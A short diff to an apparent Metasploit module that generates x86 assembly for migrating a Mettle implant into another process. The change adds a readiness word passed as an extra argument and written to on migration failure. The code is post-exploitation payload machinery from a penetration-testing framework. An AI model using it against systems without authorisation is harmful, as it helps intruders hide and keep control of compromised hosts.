@@ -15,6 +15,7 @@ module Msf
       entry_offset = elf_entry_point(opts.fetch(:payload))
 
       %(
+      pop ebp                    ; child-readiness word
       pop ebx                    ; source Mettle pid
       xor ecx, ecx
       mov eax, 434               ; pidfd_open(pid, 0)
@@ -45,14 +46,16 @@ module Msf
       push 7                     ; AT_BASE type
       push ebx                   ; envp terminator
       push ebx                   ; argv terminator
+      push ebp                   ; argv[2] = child-readiness word
       push edi                   ; argv[1] = transport fd
       push ecx                   ; argv[0]
-      push 2                     ; argc
+      push 3                     ; argc
 
       add esi, #{entry_offset}
       jmp esi
 
     migrate_failed:
+      mov dword [ebp], eax
       mov eax, 1                 ; exit(1)
       mov ebx, 1
       int 0x80
